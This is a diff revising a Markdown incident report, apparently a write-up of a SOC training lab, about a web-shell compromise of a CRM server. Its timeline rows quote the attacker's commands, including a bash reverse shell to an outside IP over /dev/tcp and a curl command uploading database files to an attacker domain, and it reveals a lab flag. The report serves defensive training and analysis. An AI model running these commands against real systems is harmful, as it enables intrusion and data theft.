@@ -32,21 +32,23 @@ A critical compromise of production CRM server `TPMHQ-CRM01` running on Ubuntu 2
 
 ---
 
-## 3. Investigation Timeline (UTC / Scenario Time)
+## 3. Investigation Timeline (Normalized to UTC)
 
-| Timestamp | Log Source / Event | Technical Observation & Correlation |
+> **Timezone Normalization Note:** In this lab, Splunk indexed web access logs in **UTC** (`14:17`–`14:28`), whereas the browser-based TryDetectMe XDR console rendered alert timestamps in the analyst's local timezone (**UTC+6**, `20:27`–`21:40`). All timestamps below are normalized to **UTC** (with the raw UTC+6 UI timestamp shown in parentheses so they can be cross-checked against the screenshots).
+
+| Timestamp (UTC) | Log Source / Event | Technical Observation & Correlation |
 | :--- | :--- | :--- |
-| `Nov 6, 2025 14:17 - 14:20` | Splunk / `access_combined` | Multiple foreign IPs initiated automated POST credential stuffing against `/CRM/login.php` resulting in high-frequency `401 Unauthorized` responses (66.03%). |
-| `Nov 6, 2025 14:27:32` | Splunk / `access_combined` | Attacker IP `34.67.91[.]83` using `python-requests/2.31.0` submitted an unauthenticated `POST /CRM/portal/upload.php`, successfully writing `/var/www/html/CRM/portal/uploads/invoice.php` (`HTTP 200`, 826 bytes). |
-| `Nov 6, 2025 20:27:00` | TryDetectMe XDR / EDR Alert | High-severity alert triggered: **Suspicious File Write: Backdoor:PHP/Generic** on `TPMHQ-CRM01`. |
-| `Nov 6, 2025 14:27:34` | Splunk / `access_combined` | Attacker invoked `POST /CRM/portal/uploads/invoice.php?q=ZDJodl1XMXA&auth=31337`. Decoded via **Decodora** as `whoami` to verify web context execution. |
-| `Nov 6, 2025 14:28:34` | Splunk / `access_combined` | Attacker invoked `POST /CRM/portal/uploads/invoice.php?q=WW1GemFDQxRh...&auth=31337`. Decoded via **Decodora** as `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`. |
-| `Nov 6, 2025 20:29:00` | TryDetectMe XDR / EDR Alert | High-severity alert triggered: **Parent-Child Anomaly: Shell Spawn** on `TPMHQ-CRM01`. Parent `/usr/sbin/php-fpm7.4` spawned `/bin/bash` with reverse shell connecting to `115.58.148[.]86:8080`. |
-| `Nov 6, 2025 20:34:00` | TryDetectMe XDR / EDR Alert | Medium-severity alert triggered: **Unusual User Behavior: System Discovery** under `www-data` (Session: non-interactive). Attacker executed `uname -a`, `ip a`, and `find /etc -type f \( -name '*.yml' -o -name '*.json' -o -name '*.toml' \)`. |
-| `Nov 6, 2025 20:34:10` | TryDetectMe XDR / Process Info | Sensitive credential access: Process `cat` (PID `1216`) read `/etc/trycrm/config.json`, exposing database connection parameters and local database paths. |
-| `Nov 6, 2025 20:37:00` | TryDetectMe XDR / Process Info | Data Exfiltration: Process `curl` (PID `1224`) executed: `curl -sS -T /var/lib/trycrm/prod.db -T /var/lib/trycrm/prod.idx https://portaldrop2025.xyz/x7Ja0mlqP` connecting outbound to `115.58.148[.]86:443`. |
-| `Nov 6, 2025 21:40:00` | TryDetectMe XDR / EDR Alert | Low-severity alert: **Hands-On-Keyboard Root Activity** on `TMPEU-UATSERVER`. Evaluated during triage to ensure no cross-server lateral movement occurred. |
-| `Investigation Phase` | TryDetectMe XDR / Response | Analyst completed tactical response: host isolation, process termination (`PID 1203`), IP/domain blocking (`115.58.148[.]86`, `portaldrop2025[.]xyz`), web shell quarantine, and root cause analysis. |
+| `2025-11-06 14:17 – 14:20 UTC` | Splunk / `access_combined` | Multiple external IPs initiated automated POST credential stuffing against `/CRM/login.php`, generating high-frequency `401 Unauthorized` responses (66.03%). |
+| `2025-11-06 14:27:00 UTC` *(20:27:00 UTC+6)* | TryDetectMe XDR / EDR Alert | High-severity alert triggered (minute-rounded in XDR UI): **Suspicious File Write: Backdoor:PHP/Generic** on `TPMHQ-CRM01`. |
+| `2025-11-06 14:27:32 UTC` | Splunk / `access_combined` | Attacker IP `34.67.91[.]83` (`python-requests/2.31.0`) sent an unauthenticated `POST /CRM/portal/upload.php`, writing `/var/www/html/CRM/portal/uploads/invoice.php` (`HTTP 200`, 826 bytes). |
+| `2025-11-06 14:27:34 UTC` | Splunk / `access_combined` | Attacker invoked `POST /CRM/portal/uploads/invoice.php?q=ZDJodl1XMXA&auth=31337`. Decoded via **Decodora** as `whoami` to verify execution context. |
+| `2025-11-06 14:28:34 UTC` | Splunk / `access_combined` | Attacker invoked `POST /CRM/portal/uploads/invoice.php?q=WW1GemFDQxRh...&auth=31337`. Decoded via **Decodora** as `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`. |
+| `2025-11-06 14:29:00 UTC` *(20:29:00 UTC+6)* | TryDetectMe XDR / EDR Alert | High-severity alert triggered: **Parent-Child Anomaly: Shell Spawn** on `TPMHQ-CRM01`. Parent `/usr/sbin/php-fpm7.4` spawned `/bin/bash` connecting outbound to `115.58.148[.]86:8080`. |
+| `2025-11-06 14:34:00 UTC` *(20:34:00 UTC+6)* | TryDetectMe XDR / EDR Alert | Medium-severity alert triggered: **Unusual User Behavior: System Discovery** under `www-data` (`uname -a`, `ip a`, `find /etc -type f \( -name '*.yml' -o -name '*.json' -o -name '*.toml' \)`). |
+| `2025-11-06 14:34:10 UTC` *(20:34:10 UTC+6)* | TryDetectMe XDR / Process Info | Sensitive credential access: `cat` (PID `1216`) read `/etc/trycrm/config.json`, exposing database paths and credentials. |
+| `2025-11-06 14:37:00 UTC` *(20:37:00 UTC+6)* | TryDetectMe XDR / Process Info | Data Exfiltration: `curl` (PID `1224`) executed `curl -sS -T /var/lib/trycrm/prod.db -T /var/lib/trycrm/prod.idx https://portaldrop2025.xyz/x7Ja0mlqP` (`115.58.148[.]86:443`). |
+| `2025-11-06 15:40:00 UTC` *(21:40:00 UTC+6)* | TryDetectMe XDR / EDR Alert | Low-severity alert: **Hands-On-Keyboard Root Activity** on `TMPEU-UATSERVER`. Triaged and verified as isolated benign maintenance (no lateral movement). |
+| `Response Phase (in XDR Simulator)` | TryDetectMe XDR / Response | Executed required simulator response actions: host isolation, process termination (`PID 1203`), IP/domain blocking (`115.58.148[.]86`, `portaldrop2025[.]xyz`), and web shell quarantine (`THM{p0rtal_dropp3d?}`). |
 
 ---
 
@@ -120,19 +122,16 @@ To ensure defensible Tier-1 alert triage, potential benign explanations were eva
 
 ## 6. Containment & Remediation Actions
 
-### 1. Tactical Endpoint Containment
-- **Host Isolation:** Quarantined `TPMHQ-CRM01` via TryDetectMe XDR to sever all outbound connections while preserving volatile memory for digital forensics.
-- **Process Termination:** Killed active rogue child bash processes (`PID 1203`, `PID 1224`) and restarted PHP-FPM service workers.
-- **Artifact Quarantine:** Quarantined and extracted `/var/www/html/CRM/portal/uploads/invoice.php` for static analysis and hash generation.
-- **Application Hardening:** Disabled direct script execution within the `/uploads/` directory in Apache configuration (`php_flag engine off` and `deny from all` for `.php` files).
+### 1. Actions Executed in the TryDetectMe XDR Simulator
+- **Host Isolation:** Isolated `TPMHQ-CRM01` in the TryDetectMe XDR console.
+- **Process Termination:** Terminated the active reverse-shell child process (`PID 1203`).
+- **Artifact Quarantine:** Quarantined `/var/www/html/CRM/portal/uploads/invoice.php` (completing the room remediation step and releasing flag `THM{p0rtal_dropp3d?}`).
+- **Simulator IOC Blocks:** Added `115.58.148[.]86` and `portaldrop2025[.]xyz` to the simulator blocklist.
 
-### 2. Perimeter Network Containment
-- **Firewall Egress Drop Rules:** Blocked destination IP `115.58.148[.]86` and ingress IP `34.67.91[.]83` across all edge firewalls.
-- **DNS Sinkholing:** Configured internal DNS resolvers to sinkhole `portaldrop2025[.]xyz` to catch any persistence attempts.
-
-### 3. Identity & Credential Remediation
-- **Database Password Rotation:** Immediately rotated all database credentials stored in `/etc/trycrm/config.json`.
-- **CRM Portal Audit:** Forced password resets for all CRM users whose hashed credentials or sessions were stored in `prod.db`.
+### 2. Recommended Production Hardening & Credential Remediation
+- **Web Server Upload Hardening:** Disable script execution in `/var/www/html/CRM/portal/uploads/` (`php_admin_flag engine off` / Nginx location deny for `*.php`), validate file extensions server-side against an allowlist, and store uploads outside the web root.
+- **Perimeter Egress & Ingress Filtering:** Block attacker ingress IP `34.67.91[.]83` and C2 IP `115.58.148[.]86` at perimeter firewalls, and sinkhole `portaldrop2025[.]xyz` at internal DNS resolvers.
+- **Database & Application Credential Rotation:** Rotate the database credentials exposed in `/etc/trycrm/config.json` and force password/session resets for all customer/user records inside the exfiltrated `prod.db` database.
 
 ### 4. SIEM Detection Engineering Queries
 
